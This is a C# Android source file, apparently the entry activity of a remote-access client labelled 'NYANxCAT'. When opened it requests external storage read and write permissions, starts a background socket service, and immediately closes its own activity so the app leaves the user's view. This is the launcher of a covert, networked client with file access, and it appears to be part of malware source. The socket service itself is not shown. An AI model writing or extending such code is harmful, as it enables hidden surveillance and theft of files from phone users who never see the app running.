using ClientAndroid.Project;

using Android.App;
using Android.OS;
using Android.Support.V7.App;
using Android;
using Android.Content;


namespace ClientAndroid
{
    [Activity(Label = "NYANxCAT", Theme = "@style/AppTheme", MainLauncher = true)]
    public class MainActivity : AppCompatActivity
    {
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);

            // Set our view from the "main" layout resource
            SetContentView(Resource.Layout.activity_main);

            // give permissions to read and write storage
            RequestPermissions(new string[] {
                Manifest.Permission.ReadExternalStorage,
                Manifest.Permission.WriteExternalStorage }, 00);

            // Socket service
            StartService(new Intent(this, typeof(SocketClient)));

            // remove activity
            this.FinishAffinity();
        }
    }
}